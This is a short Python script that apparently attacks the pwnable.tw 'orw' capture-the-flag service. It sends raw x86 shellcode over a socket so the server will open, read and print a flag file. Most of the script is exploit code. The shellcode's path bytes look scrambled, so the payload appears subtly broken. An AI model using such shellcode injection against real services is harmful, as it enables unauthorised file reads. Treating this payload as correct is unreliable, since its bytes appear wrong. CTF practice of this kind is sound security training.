#!/usr/bin/env python3

# Let me try a completely different approach - maybe there's a simple issue

import socket
import time

def test_connection():
    # First, let's just test the connection without shellcode
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("chall.pwnable.tw", 10001))
    
    data = s.recv(1024)
    print(f"Received: {repr(data)}")
    
    # Send some dummy data to see what happens
    s.send(b"AAAA")
    
    time.sleep(2)
    try:
        response = s.recv(1024)
        print(f"Response: {repr(response)}")
    except:
        print("No response")
    
    s.close()

def try_simple_shellcode():
    # Try the simplest possible shellcode
    shellcode = b"\x31\xc0\x50\x68\x67\x61\x6c\x66\x68\x2f\x72\x77\x2f\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb2\x64\x31\xc0\xb0\x03\xcd\x80\x89\xc2\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x40\xcd\x80"
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("chall.pwnable.tw", 10001))
    
    data = s.recv(1024)
    print(f"Received: {repr(data)}")
    
    s.send(shellcode)
    
    time.sleep(2)
    try:
        response = s.recv(1024)
        print(f"Response: {repr(response)}")
        if b"FLAG" in response or b"orw" in response:
            print("GOT FLAG!")
    except:
        print("No response")
    
    s.close()

if __name__ == "__main__":
    print("Testing connection...")
    test_connection()
    
    print("\nTrying simple shellcode...")
    try_simple_shellcode()